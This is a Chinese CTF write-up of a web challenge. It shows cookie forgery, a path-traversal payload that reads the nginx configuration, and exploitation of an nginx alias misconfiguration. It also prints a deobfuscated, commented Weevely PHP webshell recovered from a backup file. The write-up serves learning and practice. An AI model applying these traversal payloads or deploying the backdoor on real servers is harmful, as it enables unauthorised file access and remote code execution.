# Web_php_wrong_nginx_conf

## 思路分析

> 打开网站,是一个登录界面,没有注册页面.扫目录,发现存在robots.txt,得到2个路径hint.php和Hack.php.访问hint.php提示配置文件存在问题,下一步就是读取这个配置文件了.前面扫目录时也发现存在/admin路径,访问提示请继续.burp抓了下数据包,发现请求时cookie中有个字段isLogin=0,改为1可以访问页面.多点几下,发现/admin/admin.php?file=index&ext=php这个url,这里可能存在任意文件访问漏洞.路径中尝试../返回正常,使用?file=in./dex&ext=php返回错误说明./可以利用.最终用/admin/admin.php?file=..././..././..././..././..././..././..././etc/nginx/sites-enabled/site.conf&ext=读取到了配置文件.翻看配置文件,发现了

```
; } location /web-img { alias /images/; autoindex on
```
> 说明/web-img目录存在问题,直接访问,发现可以访问,使用/web-img../得到了根目录,测试发现有权限读取的只有/var/www/这个目录,访问发现存在hack.php.bak文件,下载下来分析.

> 这个其实是Weevely生成的php木马,用文件内容先是进行字符串拼接,然后替换字符,并用最终结果创建函数,格式化后内容为

```
<?php
$kh = "42f7";

$kf = "e9ac";

// 循环异或加密解密，密钥 $k
function x($t,$k){
    $c=strlen($k);
    $l=strlen($t);
    $o="";
    for($i=0;$i<$l;){
        for($j=0;($j<$c&&$i<$l);$j++,$i++){
            $o.=$t{$i}^$k{$j};
        }
    }
    return $o;
}
$r=$_SERVER;
$rr=@$r["HTTP_REFERER"];
$ra=@$r["HTTP_ACCEPT_LANGUAGE"];
if($rr&&$ra){
    // 将 referer 的 query string 的 各个 value 取出到 $q
    $u=parse_url($rr); // parse referer, return array, keys: scheme,host,port,user,pass,path,query,fragment
    parse_str($u["query"],$q); // parse query string into $q (array).
    $q=array_values($q);        // array values 

    // 分析 Accept-Language，提取 每种语言的首字母和权重数字。
    // Searches $ra for all matches to the regular expression given and puts them in $m
    preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/",$ra,$m);
    if($q&&$m){
        @session_start();
        $s=&$_SESSION;
        $ss="substr";
        $sl="strtolower";
        $i=$m[1][0].$m[1][1];              // 两组首字母
        $h=$sl($ss(md5($i.$kh),0,3)); // md5($i . $kh) 的前三个字符小写。攻击时附在 $p 开头
        $f=$sl($ss(md5($i.$kf),0,3)); // $p 是编码后 Payload，攻击时附加到 $p 后面

        // 拼接 Payload
        $p="";
        for($z=1;$z<count($m[1]);$z++)  // 从 $q 中取出 $m 正则匹配到的第 2 组中索引 1 -- count($m[1])-1 的值 (0-9) 作为键的值连接，得到 $p
            $p.=$q[$m[2][$z]];         // 上例（language）, $p .= $q[8]


        // 去除 $p Payload 开头的 $h
        if(strpos($p,$h)===0){        // $h 在 $p[0] 位置出现。
            $s[$i]="";        // $_SESSION[$i] = '', $i 是正则匹配到的两组首字母
            $p=$ss($p,3);    // $p 从第 3 个字符开始的子串，去掉 $h
        }
        if(array_key_exists($i,$s)){         // exist $s[$i], $_SESSION[$i] , if 条件必须有 上文 $h 在 $p[0] 位置出现
            $s[$i].=$p;
            $e=strpos($s[$i],$f);   // $f 是 md5 前三个字符小写，在 $s[$i]
            if($e){    // 必须有 $f 作为“停止字符串”
                $k=$kh.$kf; // 4f7f28d7
                ob_start();
                /*
                去除末尾的 $f
                URL safe base64 还原为普通 base64
                base64 解码
                循环异或解密
                zlib 解码，还原出 PHP 代码
                执行 PHP 代码
                */
                //@eval(@gzuncompress(@x(@base64_decode( preg_replace(array("/_/","/-/"),array("/","+"),$ss($s[$i],0,$e)) ),$k)));
                echo "CMD WILL EXEC:\n<br />";
                echo(@gzuncompress(@x(@base64_decode( preg_replace(array("/_/","/-/"),array("/","+"),$ss($s[$i],0,$e)) ),$k)));
                $o=ob_get_contents();  // output
                ob_end_clean();
                $d=base64_encode(x(gzcompress($o),$k));  // 编码
                print $o;
                //print("<$k>$d</$k>");
                @session_destroy();
            }
        }
    }
?>
```

## payload

```
GET /profile.wtf?user=jlvfK HTTP/1.1
Host: 61.147.171.105:62296
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:62296/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1676894957,1676899554; last_login_info=YToxOntzOjI6ImlwIjtzOjExOiI1MC43LjI1Mi41OCI7fQ%3D%3D; USERNAME=admin; TOKEN=uYpiNNf/X0/0xNfqmsuoKFEtRlQDwNbS2T6LdHDRWH5p3x4bL4sxN0RMg17KJhAmTMyr8Sem++fldP0scW7g3w==
Connection: close
```

## flag

> ctf{a57b3698-eeae-48c0-a669-bafe3213568c}

## 参考

> https://phuker.github.io/posts/weevely-backdoor-code-analysis.html